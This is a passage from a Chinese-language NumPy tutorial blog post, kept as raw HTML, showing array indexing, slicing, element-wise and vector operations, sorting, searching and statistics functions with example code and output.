class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>]])</span><br><span class="line">b = a.tolist()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, <span class="built_in">type</span>(b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.array([<span class="string">&quot;1.2&quot;</span>, <span class="string">&quot;2.4&quot;</span>, <span class="string">&quot;3.1415&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a.itemsize * a.size)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a.astype(np.float64))</span><br></pre></td></tr></table></figure><h2><span id="一维操作">一维操作</span></h2><h3><span id="索引切片">索引切片</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a[-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a[<span class="number">9</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a[[<span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>]])</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 1 2 3 4 5 6 7 8 9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  9</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  9</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  </span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [1 5 2]</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line">b = [<span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a[b])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a[<span class="number">1</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a[<span class="number">0</span>:<span class="number">6</span>:<span class="number">2</span>])</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 1 2 3 4 5 6 7 8 9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 1 5 6]</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 1 2 3 4 5 6 7 8 9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [1 2 3]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 2 4]</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line">b = a[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, b)</span><br><span class="line">b[<span class="number">1</span>] = <span class="number">1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line">b = a[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, b)</span><br><span class="line">b[<span class="number">1</span>] = <span class="number">1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, b)</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 1 2 3 4 5 6 7 8 9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 1 2 3 4 5]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [   0 1000    2    3    4    5    6    7    8    9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [   0 1000    2    3    4    5]</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0, 1, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0, 1000, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h3><span id="元素运算">元素运算</span></h3><div class="table-container"><table><thead><tr><th>函数</th><th>属性</th><th>函数</th><th>属性</th></tr></thead><tbody><tr><td>abs</td><td>计算绝对值</td><td>divide</td><td>数组元素相除</td></tr><tr><td>fabs</td><td>计算绝对值，比abs快</td><td>floor_divide</td><td>返回整数结果，先调用divide，再调用floor函数</td></tr><tr><td>sqrt</td><td>以元素为单位返回数组的非负平方根</td><td>power</td><td>第一个数组元素从第二个数组逐元素提升为幂s。</td></tr><tr><td>square</td><td>返回输入的元素的平方</td><td>maximum</td><td>数组元素最大值</td></tr><tr><td>exp</td><td>计算输入数组中所有元素的指数</td><td>fmax</td><td>数组元素最大值</td></tr><tr><td>log</td><td>底数计算</td><td>minimum</td><td>数组元素最小值</td></tr><tr><td>rint</td><td>将数组的元素四舍五入</td><td>fmin</td><td>数组元素最小值</td></tr><tr><td>ceil</td><td>向上取整</td><td>mod</td><td>返回元素的除法余数</td></tr><tr><td>floor</td><td>向下取整</td><td>copysign</td><td>按元素方式将x1的符号更改为x2的符号</td></tr><tr><td>isnan</td><td>对nan逐个元素进行测试，并返回bool数组</td><td>greater</td><td>返回x1&gt;x2的真值</td></tr><tr><td>cos</td><td>返回余弦值</td><td>greater_equal</td><td>返回x1&gt;=x2的真值</td></tr><tr><td>sin</td><td>返回正弦值</td><td>less</td><td>返回x1&lt;x2的真值</td></tr><tr><td>arctanh</td><td>反双曲函数的返回值</td><td>less_equal</td><td>返回x1&lt;=x2的真值</td></tr><tr><td>add</td><td>逐元素相加</td><td>equal</td><td>返回x1=x2的真值</td></tr><tr><td>subtract</td><td>逐元素相减</td><td>not_equal</td><td>返回x1!=x2的真值</td></tr><tr><td>multiply</td><td>逐元素相乘</td><td></td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.arange(-<span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.<span class="built_in">abs</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.sqrt(a))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.random.randint(<span class="number">0</span>, <span class="number">100</span>, <span class="number">15</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.<span class="built_in">max</span>(a))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [-10  -9  -8  -7  -6  -5  -4  -3  -2  -1   0   1   2   3   4   5   6   7</span></span><br><span class="line"><span class="comment">#    8   9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [10  9  8  7  6  5  4  3  2  1  0  1  2  3  4  5  6  7  8  9]</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 1 2 3 4 5 6 7 8 9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0.         1.         1.41421356 1.73205081 2.         2.23606798</span></span><br><span class="line"><span class="comment">#  2.44948974 2.64575131 2.82842712 3.        ]</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ 1 74 33 21 22 59 57 56 26 25 85  0  8 53 38]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  85</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line">b = np.arange(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a, b)</span><br><span class="line">c = np.ones(<span class="number">10</span>)</span><br><span class="line">d = np.add(a, b, out=c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, <span class="built_in">id</span>(c), <span class="built_in">id</span>(d))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.array([<span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">0</span>])</span><br><span class="line">b = np.array([<span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">9</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.maximum(a, b))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.array([<span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">0</span>])</span><br><span class="line">b = np.array([<span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">9</span>])</span><br><span class="line">c = np.greater(a, b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a[c])</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [0 1 2 3 4 5 6 7 8 9] [0 1 2 3 4 5 6 7 8 9]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ 0.  2.  4.  6.  8. 10. 12. 14. 16. 18.]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  2591797890768 2591797890768</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [3 9 2 9 7 9 7 9]</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ True False  True False  True False  True False]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [3 2 7 7]</span></span><br></pre></td></tr></table></figure><h3><span id="矢量运算">矢量运算</span></h3><p>四则运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">4</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br><span class="line">y = np.array([<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x + y, x - y, x * y, x / y)</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ 8  6 12 14  8  4 10 12]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [5 4 6 7 5 3 5 6] [3 2 6 7 3 1 5 6] [4 3 0 0 4 2 0 0] [ 4.  3. inf inf  4.  2. inf inf]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 复杂的逻辑运算和多元运算 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">4</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>])</span><br><span class="line">y = np.array([<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x &gt; <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x == <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x &lt; <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x &gt; y, x == y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.logical_and(x, y))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x[x &gt; <span class="number">5</span>])</span><br><span class="line">x[x == <span class="number">4</span>] = <span class="number">99</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x)</span><br><span class="line">x[y == <span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">x = np.array([-<span class="number">4</span>, -<span class="number">3</span>, <span class="number">6</span>, -<span class="number">7</span>, <span class="number">4</span>, -<span class="number">2</span>, <span class="number">5</span>, -<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.where(x &gt; <span class="number">0</span>, <span class="number">1</span>, -<span class="number">1</span>))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ True  True  True  True  True False  True  True]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [False False False False False  True False False]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [False False False False False False False False]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ True  True  True  True  True  True  True  True] [False False False False False False False False]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ True  True False False  True  True False False]</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [6 7 6]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [99  3  6  7 99  2  5  6]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [99  3  0  0 99  2  0  0]</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [-1 -1  1 -1  1 -1  1 -1]</span></span><br></pre></td></tr></table></figure><h3><span id="搜索排序">搜索排序</span></h3><div class="table-container"><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>numpy.sort()</td><td>返回数组的排序副本</td></tr><tr><td>ndarray.sort()</td><td>就地排序数组</td></tr><tr><td>numpy.searchsorted()</td><td>查找应在其中插入元素以保持顺序的索引</td></tr><tr><td>numpy.count_nonzero()</td><td>统计数组非0个数</td></tr><tr><td>numpy.where()</td><td>根据条件从x或者y中选择返回的元素</td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">a = np.random.randint(<span class="number">0</span>, <span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line">plt.scatter(<span class="built_in">range</span>(<span class="number">200</span>), a)</span><br><span class="line">plt.show()</span><br><span class="line">np.sort(a)</span><br><span class="line">plt.scatter(<span class="built_in">range</span>(<span class="number">200</span>), a)</span><br><span class="line">plt.show()</span><br><span class="line">a.sort()</span><br><span class="line">plt.scatter(<span class="built_in">range</span>(<span class="number">200</span>), a)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/numpylearn/1650628488044.png" alt="1650628488044"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.random.randint(<span class="number">0</span>, <span class="number">100</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">a.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.searchsorted(a, <span class="number">5</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.insert(a, np.searchsorted(a, <span class="number">5</span>), <span class="number">5</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.append(a, <span class="number">100</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.where(a == <span class="number">1</span>))</span><br><span class="line">a = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.count_nonzero(a))</span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [11 23 32 47 57 64 68 72 86 86]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  0</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ 5 11 23 32 47 57 64 68 72 86 86]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  [ 11  23  32  47  57  64  68  72  86  86 100]</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  (array([0, 3, 4, 5], dtype=int64),)</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt;  5</span></span><br></pre></td></tr></table></figure><h3><span id="数理统计">数理统计</span></h3><div class="table-container"><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>np.sum()</td><td>计算数组元素的总和</td></tr><tr><td>np.mean()</td><td>计算数组元素的平均值</td></tr><tr><td>np.std()</td><td>计算数组的标准差</td></tr><tr><td>np.average()</td><td>计算数组的加权平均值</td></tr><tr><td>np.cumsum()</td><td>数组元素的累加和(前缀和数组)</td></tr><tr><td>np.cumprod()</td><td>数组元素的累乘积</td></tr><tr><td>np.unique(x)</td><td>计算x中的唯一元素,并返回有序结果</td></tr><tr><td>np.intersectld(x,y)</td><td>计算x和y的公共元素，返回有序结果</td></tr><tr><td>np.unionld(x,y)</td><td>计算x和 y的并集，返回有序结果</td></tr><tr><td>np.inld(x,y)</td><td>得到一个表示x 的元素是否包含于y的布尔型数组</td></tr><tr><td>np.setdiffld(x,y)</td><td>集合差，即元素在x中且不在y中</td></tr><tr><td>np.setxorld(x,y)</td><td>集合对称差，在一个数组中单不同时存在于两个数组</td></tr></tbody></table></div><p><img src="http://zzuzyj.github.io/2022/05/03/numpylearn/1650631250561.png" alt="1650631250561"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">101</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.<span class="built_in">sum</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.mean(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.std(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">a = np.array([<span class="number">80</span>, <span class="number">67</span>, <span class="number">61</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.average(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, np.mean(a))</span><br><span 